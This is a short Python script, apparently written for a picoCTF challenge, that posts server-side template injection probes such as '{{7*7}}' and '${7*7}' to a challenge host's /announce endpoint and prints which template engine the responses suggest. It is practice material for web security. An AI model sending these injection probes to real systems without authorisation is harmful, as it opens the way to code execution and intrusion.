import requests

payloads = ['${7*7}','a{*comment*}b','${"z".join("ab")}','{{7*7}}','{{7*\'7\'}}']

url = "http://rescued-float.picoctf.net:60555"

def req(index):

    data = {
        "content":payloads[index]
    }

    resp = requests.post(f"{url}/announce",data=data)
    return resp.text
 

if payloads[0] not in req(0):

    if payloads[1] not in req(1):
        print("Smarty")
    else:
        if payloads[2] not in req(2):
            print("Mako")
        else:
            print("Unknown")
else:
    if payloads[3] not in req(3):
        if payloads[4] not in req(4):
            print("Jinja2 or Twig")
        else:
            print("Unknown")
    else:
        print("Not vulnerable")